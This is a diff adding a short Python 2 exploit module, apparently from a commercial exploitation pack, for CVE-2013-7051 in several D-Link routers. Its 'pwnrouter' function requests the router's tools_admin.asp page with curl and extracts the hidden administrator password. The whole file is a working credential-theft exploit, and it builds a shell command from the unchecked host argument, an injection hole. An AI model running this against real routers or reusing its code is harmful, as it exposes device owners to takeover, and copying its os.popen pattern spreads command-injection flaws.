@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_dlink_13'
+_vendor_ = 'd-link'
+_model_  = ['DGL-5500', 'DIR-855L', 'DIR-835']
+_vuln_   = 'Clear Text Password'
+_cve_    = 'CVE-2013-7051'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  data = ''
+  try:
+    data = os.popen("curl -s http://%s/tools_admin.asp/ |awk '/hidden/ && /admin_password_tmp/ && /value/ {print $5}'"%host).read()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if data:
+    print '[+] %s vulnerable:' % host
+    print '%s' % data
+  else:
+    print '[+] %s not vulnerable' % host
+    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
